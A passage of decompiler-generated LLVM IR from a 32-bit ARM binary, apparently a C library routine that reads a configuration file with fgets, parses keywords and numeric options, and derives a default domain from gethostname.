  store i32 %v4_1654c, i32* %r4.global-to-local, align 4
  %v1_16550 = load i32, i32* @r8, align 4
  %v3_16550 = mul i32 %v1_16550, %v4_1654c
  %v4_16550 = add i32 %v3_16550, %v2_16540
  store i32 %v4_16550, i32* %lr.global-to-local, align 4
  %v2_16558 = load i16, i16* %stack_var_-68, align 2
  %v3_16558 = sext i16 %v2_16558 to i32
  store i32 %v3_16558, i32* %r0.global-to-local, align 4
  %v6_16558 = load i32, i32* %stack_var_-64, align 4
  store i32 %v6_16558, i32* %r1.global-to-local, align 4
  %v9_16558 = load i32, i32* %stack_var_-60, align 4
  store i32 %v9_16558, i32* %r2.global-to-local, align 4
  %v2_1655c = load i32, i32* @sl, align 4
  %v3_1655c = add i32 %v2_1655c, %v0_1654c
  %v4_1655c = inttoptr i32 %v3_1655c to i32*
  store i32 %v2_16540, i32* %v4_1655c, align 4
  %v0_16560 = load i32, i32* %lr.global-to-local, align 4
  %v1_16560 = inttoptr i32 %v0_16560 to i32*
  %v2_16560 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_16560, i32* %v1_16560, align 4
  %v3_16560 = add i32 %v0_16560, 4
  %v4_16560 = inttoptr i32 %v3_16560 to i32*
  %v5_16560 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16560, i32* %v4_16560, align 4
  %v6_16560 = add i32 %v0_16560, 8
  %v7_16560 = inttoptr i32 %v6_16560 to i32*
  %v8_16560 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_16560, i32* %v7_16560, align 4
  %v9_16560 = add i32 %v0_16560, 12
  %v10_16560 = inttoptr i32 %v9_16560 to i32*
  %v11_16560 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_16560, i32* %v10_16560, align 4
  %v12_16560 = add i32 %v0_16560, 16
  store i32 %v12_16560, i32* @lr, align 4
  %v2_16564 = load i32, i32* %stack_var_-52, align 4
  store i32 %v2_16564, i32* %r0.global-to-local, align 4
  %v0_16568 = load i32, i32* %r4.global-to-local, align 4
  %v1_16568 = add i32 %v0_16568, 1
  store i32 %v1_16568, i32* %r4.global-to-local, align 4
  %v1_1656c = inttoptr i32 %v12_16560 to i32*
  store i32 %v2_16564, i32* %v1_1656c, align 4
  %v3_1656c = add i32 %v0_16560, 20
  %v4_1656c = inttoptr i32 %v3_1656c to i32*
  %v5_1656c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1656c, i32* %v4_1656c, align 4
  %v6_1656c = add i32 %v0_16560, 24
  %v7_1656c = inttoptr i32 %v6_1656c to i32*
  %v8_1656c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1656c, i32* %v7_1656c, align 4
  %v0_16570 = load i32, i32* %r4.global-to-local, align 4
  %v1_16570 = load i32, i32* @r5, align 4
  %v2_16570 = load i32, i32* @r7, align 4
  %v3_16570 = add i32 %v2_16570, %v1_16570
  %v4_16570 = inttoptr i32 %v3_16570 to i32*
  store i32 %v0_16570, i32* %v4_16570, align 4
  br label %dec_label_pc_166ec.backedge

dec_label_pc_166ec.backedge:                      ; preds = %dec_label_pc_16614, %dec_label_pc_16604, %dec_label_pc_165d0, %dec_label_pc_1654c, %dec_label_pc_166a4, %dec_label_pc_164f8, %dec_label_pc_16514, %dec_label_pc_1664c, %dec_label_pc_16654, %dec_label_pc_16638, %dec_label_pc_16688
  %v0_166f8.pre = load i32, i32* @fp, align 4
  store i32 %v2_166ec, i32* @r4, align 4
  store i32 %v2_166ec, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v0_166f8.pre, i32* %r2.global-to-local, align 4
  %v3_166fc = call i32 @fgets(i32 %v2_166ec, i32 128, i32 %v0_166f8.pre)
  store i32 %v3_166fc, i32* %r0.global-to-local, align 4
  %v2_16700 = icmp eq i32 %v3_166fc, 0
  br i1 %v2_16700, label %dec_label_pc_16708, label %dec_label_pc_16490

dec_label_pc_16578:                               ; preds = %dec_label_pc_16490
  %v0_16578 = load i32, i32* @r4, align 4
  store i32 %v0_16578, i32* %r0.global-to-local, align 4
  store i32 %v2_166c8, i32* @r1, align 4
  %v2_16580 = inttoptr i32 %v0_16578 to i8*
  %v3_16580 = call i32 @__GI_strcoll(i8* %v2_16580, i32 %v2_166c8)
  store i32 %v3_16580, i32* %r0.global-to-local, align 4
  %v2_16584 = icmp eq i32 %v3_16580, 0
  br i1 %v2_16584, label %dec_label_pc_165b8, label %dec_label_pc_1658c

dec_label_pc_1658c:                               ; preds = %dec_label_pc_16578
  %v0_1658c = load i32, i32* @r4, align 4
  store i32 %v0_1658c, i32* %r0.global-to-local, align 4
  store i32 %v2_166d4, i32* @r1, align 4
  %v2_16594 = inttoptr i32 %v0_1658c to i8*
  %v3_16594 = call i32 @__GI_strcoll(i8* %v2_16594, i32 %v2_166d4)
  store i32 %v3_16594, i32* %r0.global-to-local, align 4
  %v2_16598 = icmp eq i32 %v3_16594, 0
  br i1 %v2_16598, label %dec_label_pc_165b8, label %dec_label_pc_16638

dec_label_pc_165a4:                               ; preds = %dec_label_pc_165b8, %dec_label_pc_165a4.dec_label_pc_165a4_crit_edge
  %v2_165a8 = phi i32 [ %v1_165bc, %dec_label_pc_165a4.dec_label_pc_165a4_crit_edge ], [ %v1_165bc10, %dec_label_pc_165b8 ]
  %v0_165a8 = phi i32 [ %v1_165c4, %dec_label_pc_165a4.dec_label_pc_165a4_crit_edge ], [ %v1_165c417, %dec_label_pc_165b8 ]
  %v1_165a4 = phi i32 [ %v1_165a4.pre, %dec_label_pc_165a4.dec_label_pc_165a4_crit_edge ], [ 14416, %dec_label_pc_165b8 ]
  %v1_165a8 = phi i32 [ %v0_165bc, %dec_label_pc_165a4.dec_label_pc_165a4_crit_edge ], [ %v0_165bc9, %dec_label_pc_165b8 ]
  %v2_165a4 = add i32 %v1_165a8, %v1_165a4
  %v3_165a4 = inttoptr i32 %v2_165a4 to i32*
  %v4_165a4 = load i32, i32* %v3_165a4, align 4
  store i32 %v4_165a4, i32* %r3.global-to-local, align 4
  %v3_165a8 = add i32 %v1_165a8, %v2_165a8
  %v4_165a8 = inttoptr i32 %v3_165a8 to i32*
  store i32 %v0_165a8, i32* %v4_165a8, align 4
  %v0_165ac = load i32, i32* %r3.global-to-local, align 4
  %v1_165ac = load i32, i32* %r2.global-to-local, align 4
  %v4_165ac = mul i32 %v1_165ac, 4
  %v5_165ac = add i32 %v4_165ac, %v0_165ac
  %v6_165ac = inttoptr i32 %v5_165ac to i32*
  %v7_165ac = load i32, i32* %v6_165ac, align 4
  store i32 %v7_165ac, i32* @r0, align 4
  %v0_165b0 = call i32 @free()
  store i32 %v0_165b0, i32* %r0.global-to-local, align 4
  %v0_165bc = load i32, i32* @r5, align 4
  %v1_165bc = load i32, i32* @sb, align 4
  %v2_165bc = add i32 %v1_165bc, %v0_165bc
  %v3_165bc = inttoptr i32 %v2_165bc to i32*
  %v4_165bc = load i32, i32* %v3_165bc, align 4
  store i32 %v4_165bc, i32* %r3.global-to-local, align 4
  %v2_165c0 = icmp eq i32 %v4_165bc, 0
  %v1_165c4 = add i32 %v4_165bc, -1
  store i32 %v1_165c4, i32* %r2.global-to-local, align 4
  br i1 %v2_165c0, label %dec_label_pc_165cc, label %dec_label_pc_165a4.dec_label_pc_165a4_crit_edge

dec_label_pc_165a4.dec_label_pc_165a4_crit_edge:  ; preds = %dec_label_pc_165a4
  %v1_165a4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_165a4

dec_label_pc_165b8:                               ; preds = %dec_label_pc_1658c, %dec_label_pc_16578
  store i32 14416, i32* @r4, align 4
  %v0_165bc9 = load i32, i32* @r5, align 4
  %v1_165bc10 = load i32, i32* @sb, align 4
  %v2_165bc11 = add i32 %v1_165bc10, %v0_165bc9
  %v3_165bc12 = inttoptr i32 %v2_165bc11 to i32*
  %v4_165bc13 = load i32, i32* %v3_165bc12, align 4
  store i32 %v4_165bc13, i32* %r3.global-to-local, align 4
  %v2_165c015 = icmp eq i32 %v4_165bc13, 0
  %v1_165c417 = add i32 %v4_165bc13, -1
  store i32 %v1_165c417, i32* %r2.global-to-local, align 4
  br i1 %v2_165c015, label %dec_label_pc_165cc, label %dec_label_pc_165a4

dec_label_pc_165cc:                               ; preds = %dec_label_pc_165a4, %dec_label_pc_165b8
  store i32 14416, i32* @r6, align 4
  br label %dec_label_pc_165d0

dec_label_pc_165d0:                               ; preds = %dec_label_pc_16614, %dec_label_pc_165cc
  %v0_165d0 = load i32, i32* @r7, align 4
  store i32 %v0_165d0, i32* %r0.global-to-local, align 4
  %v0_165d4 = call i32 @skip_nospace()
  store i32 %v0_165d4, i32* %r0.global-to-local, align 4
  %v1_165d8 = inttoptr i32 %v0_165d4 to i8*
  %v2_165d8 = call i32 @skip_and_NUL_space(i8* %v1_165d8)
  store i32 %v2_165d8, i32* %r0.global-to-local, align 4
  %v0_165dc = load i32, i32* @r5, align 4
  %v1_165dc = load i32, i32* @sb, align 4
  %v2_165dc = add i32 %v1_165dc, %v0_165dc
  %v3_165dc = inttoptr i32 %v2_165dc to i32*
  %v4_165dc = load i32, i32* %v3_165dc, align 4
  store i32 %v2_165d8, i32* @r4, align 4
  %tmp69 = mul i32 %v4_165dc, 4
  %v3_165e8 = add i32 %tmp69, 4
  store i32 %v3_165e8, i32* @r1, align 4
  %v1_165ec = load i32, i32* @r6, align 4
  %v2_165ec = add i32 %v1_165ec, %v0_165dc
  %v3_165ec = inttoptr i32 %v2_165ec to i32*
  %v4_165ec = load i32, i32* %v3_165ec, align 4
  store i32 %v4_165ec, i32* %r0.global-to-local, align 4
  %v1_165f0 = inttoptr i32 %v4_165ec to i32*
  %v2_165f0 = call i32 @realloc(i32* %v1_165f0)
  store i32 %v2_165f0, i32* %r3.global-to-local, align 4
  %v2_165f4 = icmp eq i32 %v2_165f0, 0
  %v0_165f8 = load i32, i32* @r7, align 4
  store i32 %v0_165f8, i32* %r0.global-to-local, align 4
  %v0_165fc = load i32, i32* @r4, align 4
  store i32 %v0_165fc, i32* @r7, align 4
  br i1 %v2_165f4, label %dec_label_pc_166ec.backedge, label %dec_label_pc_16604

dec_label_pc_16604:                               ; preds = %dec_label_pc_165d0
  %v1_16604 = load i32, i32* @r5, align 4
  %v2_16604 = load i32, i32* @r6, align 4
  %v3_16604 = add i32 %v2_16604, %v1_16604
  %v4_16604 = inttoptr i32 %v3_16604 to i32*
  store i32 %v2_165f0, i32* %v4_16604, align 4
  %v1_16608 = inttoptr i32 %v0_165f8 to i8*
  %v2_16608 = call i32 @__GI_strdup(i8* %v1_16608)
  store i32 %v2_16608, i32* %r0.global-to-local, align 4
  %v2_1660c = icmp eq i32 %v2_16608, 0
  br i1 %v2_1660c, label %dec_label_pc_166ec.backedge, label %dec_label_pc_16614

dec_label_pc_16614:                               ; preds = %dec_label_pc_16604
  %v0_16614 = load i32, i32* @r5, align 4
  %v1_16614 = load i32, i32* @sb, align 4
  %v2_16614 = add i32 %v1_16614, %v0_16614
  %v3_16614 = inttoptr i32 %v2_16614 to i32*
  %v4_16614 = load i32, i32* %v3_16614, align 4
  store i32 %v4_16614, i32* %r3.global-to-local, align 4
  %v1_16618 = load i32, i32* @r6, align 4
  %v2_16618 = add i32 %v1_16618, %v0_16614
  %v3_16618 = inttoptr i32 %v2_16618 to i32*
  %v4_16618 = load i32, i32* %v3_16618, align 4
  store i32 %v4_16618, i32* %r2.global-to-local, align 4
  %v1_1661c = add i32 %v4_16614, 1
  store i32 %v1_1661c, i32* %r1.global-to-local, align 4
  %v5_16620 = mul i32 %v4_16614, 4
  %v6_16620 = add i32 %v4_16618, %v5_16620
  %v7_16620 = inttoptr i32 %v6_16620 to i32*
  store i32 %v2_16608, i32* %v7_16620, align 4
  %v0_16624 = load i32, i32* %r1.global-to-local, align 4
  %v1_16624 = load i32, i32* @r5, align 4
  %v2_16624 = load i32, i32* @sb, align 4
  %v3_16624 = add i32 %v2_16624, %v1_16624
  %v4_16624 = inttoptr i32 %v3_16624 to i32*
  store i32 %v0_16624, i32* %v4_16624, align 4
  %v0_16628 = load i32, i32* @r4, align 4
  %v1_16628 = inttoptr i32 %v0_16628 to i8*
  %v2_16628 = load i8, i8* %v1_16628, align 1
  %v3_16628 = zext i8 %v2_16628 to i32
  store i32 %v3_16628, i32* %r3.global-to-local, align 4
  %v2_1662c = icmp eq i8 %v2_16628, 0
  br i1 %v2_1662c, label %dec_label_pc_166ec.backedge, label %dec_label_pc_165d0

dec_label_pc_16638:                               ; preds = %dec_label_pc_1658c
  %v0_16638 = load i32, i32* @r4, align 4
  store i32 %v0_16638, i32* %r0.global-to-local, align 4
  %v2_1663c = load i32, i32* %stack_var_-560, align 4
  store i32 %v2_1663c, i32* @r1, align 4
  %v2_16640 = inttoptr i32 %v0_16638 to i8*
  %v3_16640 = call i32 @__GI_strcoll(i8* %v2_16640, i32 %v2_1663c)
  store i32 %v3_16640, i32* %r0.global-to-local, align 4
  %sext2 = mul i32 %v3_16640, 16777216
  %v1_16644 = sdiv i32 %sext2, 16777216
  store i32 %v1_16644, i32* @r4, align 4
  %sext2.off = or i32 %sext2, 16777215
  %tmp70 = icmp ult i32 %sext2.off, 33554431
  br i1 %tmp70, label %dec_label_pc_1664c, label %dec_label_pc_166ec.backedge

dec_label_pc_1664c:                               ; preds = %dec_label_pc_16638
  %v0_1664c = load i32, i32* @r7, align 4
  %v2_1664c = icmp eq i32 %v0_1664c, 0
  br i1 %v2_1664c, label %dec_label_pc_166ec.backedge, label %dec_label_pc_16654

dec_label_pc_16654:                               ; preds = %dec_label_pc_1664c
  store i32 %v0_1664c, i32* @r0, align 4
  store i32 58, i32* %r1.global-to-local, align 4
  %v2_1665c = call i32 @__GI_strchr(i32 %v0_1664c, i32 58)
  store i32 %v2_1665c, i32* %r0.global-to-local, align 4
  store i32 %v2_1665c, i32* @r6, align 4
  %v3_16660 = icmp eq i32 %v2_1665c, 0
  br i1 %v3_16660, label %dec_label_pc_166ec.backedge, label %dec_label_pc_16668

dec_label_pc_16668:                               ; preds = %dec_label_pc_16654
  store i32 -33148, i32* %r1.global-to-local, align 4
  %v0_1666c = load i32, i32* @r4, align 4
  %v1_1666c = trunc i32 %v0_1666c to i8
  %v3_1666c = inttoptr i32 %v2_1665c to i8*
  store i8 %v1_1666c, i8* %v3_1666c, align 1
  %v0_16670 = load i32, i32* @r5, align 4
  %v1_16670 = load i32, i32* %r1.global-to-local, align 4
  %v2_16670 = add i32 %v1_16670, %v0_16670
  store i32 %v2_16670, i32* @r1, align 4
  %v0_16674 = load i32, i32* @r7, align 4
  store i32 %v0_16674, i32* %r0.global-to-local, align 4
  %v2_16678 = inttoptr i32 %v0_16674 to i8*
  %v3_16678 = call i32 @__GI_strcoll(i8* %v2_16678, i32 %v2_16670)
  store i32 %v3_16678, i32* %r0.global-to-local, align 4
  %v2_1667c = icmp eq i32 %v3_16678, 0
  br i1 %v2_1667c, label %dec_label_pc_166a4, label %dec_label_pc_16688

dec_label_pc_16688:                               ; preds = %dec_label_pc_16668
  %v0_1668c = load i32, i32* @r7, align 4
  store i32 %v0_1668c, i32* %r0.global-to-local, align 4
  %v0_16690 = load i32, i32* @r5, align 4
  %v2_16690 = add i32 %v0_16690, -33140
  store i32 %v2_16690, i32* @r1, align 4
  %v2_16694 = inttoptr i32 %v0_1668c to i8*
  %v3_16694 = call i32 @__GI_strcoll(i8* %v2_16694, i32 %v2_16690)
  store i32 %v3_16694, i32* %r0.global-to-local, align 4
  %v2_16698 = icmp eq i32 %v3_16694, 0
  br i1 %v2_16698, label %dec_label_pc_166a4, label %dec_label_pc_166ec.backedge

dec_label_pc_166a4:                               ; preds = %dec_label_pc_16688, %dec_label_pc_16668
  %storemerge = phi i32 [ 818, %dec_label_pc_16668 ], [ 819, %dec_label_pc_16688 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_166a4 = load i32, i32* @r6, align 4
  %v1_166a4 = add i32 %v0_166a4, 1
  store i32 %v1_166a4, i32* @r0, align 4
  %v0_166a8 = load i32, i32* @r5, align 4
  %v2_166a8 = add i32 %v0_166a8, %storemerge
  store i32 %v2_166a8, i32* @r4, align 4
  %v1_166ac = call i32 @atol(i32 %v1_166a4)
  %v2_166ac = trunc i32 %v1_166ac to i8
  store i32 %v1_166ac, i32* %r0.global-to-local, align 4
  %v3_166b0 = load i32, i32* @r4, align 4
  %v4_166b0 = inttoptr i32 %v3_166b0 to i8*
  store i8 %v2_166ac, i8* %v4_166b0, align 1
  br label %dec_label_pc_166ec.backedge

dec_label_pc_166b8:                               ; preds = %dec_label_pc_16458
  %v0_166bc = load i32, i32* @r5, align 4
  %v2_166bc = add i32 %v0_166bc, -33184
  %v2_166c8 = add i32 %v0_166bc, -33172
  %v2_166d4 = add i32 %v0_166bc, -33164
  %v2_166e0 = add i32 %v0_166bc, -33156
  store i32 %v2_166e0, i32* %r3.global-to-local, align 4
  store i32 14428, i32* @sb, align 4
  store i32 %v2_166e0, i32* %stack_var_-560, align 4
  %v2_166ec = ptrtoint i32* %stack_var_-288 to i32
  %v1_16494 = bitcast i32* %stack_var_-288 to i8*
  %v2_164c4 = ptrtoint i16* %stack_var_-68 to i32
  %v3_164d8 = bitcast i16* %stack_var_-68 to i8*
  %v2_164e4 = ptrtoint i32* %stack_var_-60 to i32
  %v2_164fc = ptrtoint i32* %stack_var_-64 to i32
  %v2_16514 = ptrtoint i32* %stack_var_-304 to i32
  store i32 %v2_166ec, i32* @r4, align 4
  store i32 %v2_166ec, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v2_16480, i32* %r2.global-to-local, align 4
  %v3_166fc66 = call i32 @fgets(i32 %v2_166ec, i32 128, i32 %v2_16480)
  store i32 %v3_166fc66, i32* %r0.global-to-local, align 4
  %v2_1670068 = icmp eq i32 %v3_166fc66, 0
  br i1 %v2_1670068, label %dec_label_pc_16708, label %dec_label_pc_16490

dec_label_pc_16708:                               ; preds = %dec_label_pc_166ec.backedge, %dec_label_pc_166b8
  %v0_16708 = load i32, i32* @fp, align 4
  store i32 %v0_16708, i32* %r0.global-to-local, align 4
  %v1_1670c = inttoptr i32 %v0_16708 to i16*
  %v2_1670c = call i32 @__GI_fclose(i16* %v1_1670c)
  store i32 %v2_1670c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16710

dec_label_pc_16710:                               ; preds = %dec_label_pc_16458, %dec_label_pc_16708
  store i32 14424, i32* %r3.global-to-local, align 4
  %v0_16714 = load i32, i32* @r5, align 4
  %v2_16714 = add i32 %v0_16714, 14424
  %v3_16714 = inttoptr i32 %v2_16714 to i32*
  %v4_16714 = load i32, i32* %v3_16714, align 4
  store i32 %v4_16714, i32* %r3.global-to-local, align 4
  %v2_16718 = icmp eq i32 %v4_16714, 0
  br i1 %v2_16718, label %dec_label_pc_16720, label %dec_label_pc_1675c

dec_label_pc_16720:                               ; preds = %dec_label_pc_16710
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_16724 = call i32 @malloc(i32 28)
  store i32 %v1_16724, i32* %r0.global-to-local, align 4
  store i32 -33128, i32* %r3.global-to-local, align 4
  store i32 14420, i32* %r2.global-to-local, align 4
  %v2_16730 = icmp eq i32 %v1_16724, 0
  %v1_16734 = load i32, i32* @r5, align 4
  br i1 %v2_16730, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_16720
  %v3_16734 = add i32 %v1_16734, -33128
  store i32 %v3_16734, i32* %r3.global-to-local, align 4
  %v3_1673828 = add i32 %v1_16734, 14420
  %v4_1673829 = inttoptr i32 %v3_1673828 to i32*
  store i32 0, i32* %v4_1673829, align 4
  %v1_1673c = load i32, i32* %r3.global-to-local, align 4
  %v2_1673c = load i32, i32* @r5, align 4
  %v3_1673c = load i32, i32* %r2.global-to-local, align 4
  %v4_1673c = add i32 %v3_1673c, %v2_1673c
  %v5_1673c = inttoptr i32 %v4_1673c to i32*
  store i32 %v1_1673c, i32* %v5_1673c, align 4
  br label %.thread4

bb63:                                             ; preds = %dec_label_pc_16720
  %v3_16738 = add i32 %v1_16734, 14420
  %v4_16738 = inttoptr i32 %v3_16738 to i32*
  store i32 %v1_16724, i32* %v4_16738, align 4
  %v1_16740 = load i32, i32* @r5, align 4
  %v2_16740 = load i32, i32* %r3.global-to-local, align 4
  %v3_16740 = add i32 %v2_16740, %v1_16740
  store i32 %v3_16740, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %bb62, %bb63
  store i32 91980, i32* @lr, align 4
  %v1_16748 = xor i1 %v2_16730, true
  call void @__pseudo_cond_branch(i1 %v1_16748, i32 ptrtoint (i32* @global_var_d8b0.471 to i32))
  store i32 14424, i32* %r2.global-to-local, align 4
  %v0_16750 = load i32, i32* @r5, align 4
  %v2_16750 = add i32 %v0_16750, 14424
  %v3_16750 = inttoptr i32 %v2_16750 to i32*
  %v4_16750 = load i32, i32* %v3_16750, align 4
  %v1_16754 = add i32 %v4_16750, 1
  store i32 %v1_16754, i32* %r3.global-to-local, align 4
  store i32 %v1_16754, i32* %v3_16750, align 4
  %v0_16760.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1675c

dec_label_pc_1675c:                               ; preds = %dec_label_pc_16710, %.thread4
  %v0_16760 = phi i32 [ %v0_16714, %dec_label_pc_16710 ], [ %v0_16760.pre, %.thread4 ]
  store i32 14428, i32* @r7, align 4
  %v2_16760 = add i32 %v0_16760, 14428
  %v3_16760 = inttoptr i32 %v2_16760 to i32*
  %v4_16760 = load i32, i32* %v3_16760, align 4
  store i32 %v4_16760, i32* @r4, align 4
  %v2_16764 = icmp eq i32 %v4_16760, 0
  br i1 %v2_16764, label %dec_label_pc_1676c, label %dec_label_pc_167ec

dec_label_pc_1676c:                               ; preds = %dec_label_pc_1675c
  %v2_1676c = ptrtoint i32* %stack_var_-544 to i32
  store i32 %v2_1676c, i32* @r6, align 4
  store i32 %v2_1676c, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_16778 = call i32 @__GI_gethostname(i32 %v2_1676c, i32 255)
  store i32 %v2_16778, i32* %r0.global-to-local, align 4
  %v2_1677c = icmp eq i32 %v2_16778, 0
  br i1 %v2_1677c, label %dec_label_pc_16788, label %dec_label_pc_167ec

dec_label_pc_16788:                               ; preds = %dec_label_pc_1676c
  store i32 %v2_1676c, i32* @r0, align 4
  store i32 46, i32* %r1.global-to-local, align 4
  %v2_16790 = call i32 @__GI_strchr(i32 %v2_1676c, i32 46)
  store i32 %v2_16790, i32* %r0.global-to-local, align 4
  %v2_16794 = icmp eq i32 %v2_16790, 0
  br i1 %v2_16794, label %dec_label_pc_167ec, label %dec_label_pc_1679c

dec_label_pc_1679c:                               ; preds = %dec_label_pc_16788
  %v1_1679c = add i32 %v2_16790, 1
  %v2_1679c = inttoptr i32 %v1_1679c to i8*
  %v3_1679c = load i8, i8* %v2_1679c, align 1
  %v4_1679c = zext i8 %v3_1679c to i32
  store i32 %v4_1679c, i32* %r3.global-to-local, align 4
  %v2_167a0 = icmp eq i8 %v3_1679c, 0
  store i32 %v1_1679c, i32* %r0.global-to-local, align 4
  br i1 %v2_167a0, label %dec_label_pc_167ec, label %dec_label_pc_167ac

dec_label_pc_167ac:                               ; preds = %dec_label_pc_1679c
  %v2_167ac = call i32 @__GI_strdup(i8* %v2_1679c)
  store i32 %v2_167ac, i32* %r0.global-to-local, align 4
  store i32 %v2_167ac, i32* @r4, align 4
  %v2_167b0 = icmp eq i32 %v2_167ac, 0
  br i1 %v2_167b0, label %dec_label_pc_167ec, label %dec_label_pc_167b8

dec_label_pc_167b8:                               ; preds = %dec_label_pc_167ac
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_167bc = call i32 @malloc(i32 4)
  store i32 %v1_167bc, i32* %r0.global-to-local, align 4
  store i32 14416, i32* %r3.global-to-local, align 4
  %v2_167c4 = icmp eq i32 %v1_167bc, 0
  %v1_167c8 = load i32, i32* @r5, align 4
  %v3_167c8 = add i32 %v1_167c8, 14416
  %v4_167c8 = inttoptr i32 %v3_167c8 to i32*
  store i32 %v1_167bc, i32* %v4_167c8, align 4
  br i1 %v2_167c4, label %dec_label_pc_167d0, label %dec_label_pc_167dc

dec_label_pc_167d0:                               ; preds = %dec_label_pc_167b8
  %v0_167d0 = load i32, i32* @r4, align 4
  store i32 %v0_167d0, i32* @r0, align 4
  %v0_167d4 = call i32 @free()
  store i32 %v0_167d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_167ec

dec_label_pc_167dc:                               ; preds = %dec_label_pc_167b8
  %v0_167dc = load i32, i32* @r5, align 4
  %v1_167dc = load i32, i32* @r7, align 4
  %v2_167dc = add i32 %v1_167dc, %v0_167dc
  %v3_167dc = inttoptr i32 %v2_167dc to i32*
  %v4_167dc = load i32, i32* %v3_167dc, align 4
  %v1_167e0 = add i32 %v4_167dc, 1
  store i32 %v1_167e0, i32* %r3.global-to-local, align 4
  %v0_167e4 = load i32, i32* @r4, align 4
  %v2_167e4 = inttoptr i32 %v1_167bc to i32*
  store i32 %v0_167e4, i32* %v2_167e4, align 4
  %v0_167e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_167e8 = load i32, i32* @r5, align 4
  %v2_167e8 = load i32, i32* @r7, align 4
  %v3_167e8 = add i32 %v2_167e8, %v1_167e8
  %v4_167e8 = inttoptr i32 %v3_167e8 to i32*
  store i32 %v0_167e8, i32* %v4_167e8, align 4
  br label %dec_label_pc_167ec

dec_label_pc_167ec:                               ; preds = %dec_label_pc_1676c, %dec_label_pc_1675c, %dec_label_pc_16448, %dec_label_pc_167ac, %dec_label_pc_1679c, %dec_label_pc_16788, %dec_label_pc_167d0, %dec_label_pc_167dc
  store i32 14412, i32* %r3.global-to-local, align 4
  %v0_167f0 = load i32, i32* @r5, align 4
  %v2_167f0 = add i32 %v0_167f0, 14412
  %v3_167f0 = inttoptr i32 %v2_167f0 to i32*
  %v4_167f0 = load i32, i32* %v3_167f0, align 4
  store i32 %v4_167f0, i32* %r0.global-to-local, align 4
  %v2_167f4 = icmp eq i32 %v4_167f0, 0
  br i1 %v2_167f4, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_167ec
  store i32 92160, i32* %lr.global-to-local, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_167ec, %bb64
  %v2_167fc = xor i1 %v2_167f4, true
  call void @__pseudo_cond_branch(i1 %v2_167fc, i32 %v4_167f0)
  %v2_16804 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_16804, i32* %r4.global-to-local, align 4
  store i32 %v12_163f8, i32* @r7, align 4
  store i32 %v15_163f8, i32* @r8, align 4
  store i32 %v18_163f8, i32* @sb, align 4
  store i32 %v21_163f8, i32* @sl, align 4
  store i32 %v27_163f8, i32* %lr.global-to-local, align 4
  ret i32 %v4_167f0

; uselistorder directives
  uselistorder i32 %v1_167bc, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1676c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_164fc, { 1, 0 }
  uselistorder i32 %v2_164e4, { 1, 0 }
  uselistorder i32 %v2_164c4, { 1, 0 }
  uselistorder i32 %v2_166ec, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 %v0_166bc, { 1, 0, 2, 3 }
  uselistorder i32 %v1_166ac, { 1, 0 }
  uselistorder i32 %v0_1664c, { 1, 0, 2 }
  uselistorder i32 %v1_165c417, { 1, 0 }
  uselistorder i32 %v1_165bc10, { 1, 0 }
  uselistorder i32 %v0_165bc9, { 1, 0 }
  uselistorder i32 %v1_165c4, { 1, 0 }
  uselistorder i32 %v2_16540, { 1, 0, 2, 3, 4 }
  uselistorder i16* %stack_var_-68, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 21, 28, 12, 13, 14, 27, 17, 15, 16, 18, 19, 20, 22, 23, 24, 25, 26 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 18, 4, 17, 5, 16, 13, 6, 7, 8, 9, 10, 11, 12, 14, 15 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 19, 3, 4, 5, 6, 7, 14, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 6, 5, 7, 9, 8, 11, 10, 13, 12, 56, 0, 14, 16, 15, 18, 17, 19, 21, 20, 23, 22, 24, 25, 27, 26, 28, 30, 29, 35, 34, 50, 49, 31, 32, 33, 37, 36, 39, 38, 40, 42, 41, 43, 45, 44, 46, 48, 47, 53, 51, 52, 55, 54 }
  uselistorder i32 (i16*)* @__GI_fclose, { 5, 4, 0, 1, 2, 3 }
  uselistorder i32 (i32)* @atol, { 2, 3, 1, 0 }
  uselistorder i32 58, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 0, 1, 2, 5, 4, 3 }
  uselistorder i32 (i32*)* @realloc, { 2, 3, 1, 0 }
  uselistorder i16 2, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 13, 15, 16, 1, 17, 12, 2, 3, 11, 18, 20, 9, 10, 23, 22, 14, 0, 21, 4, 5, 6, 19, 7, 8 }
  uselistorder i32 ()* @skip_nospace, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_fopen, { 0, 1, 5, 4, 3, 2 }
  uselistorder i32 -33232, { 1, 0 }
  uselistorder i32 819, { 0, 3, 4, 1, 2, 5 }
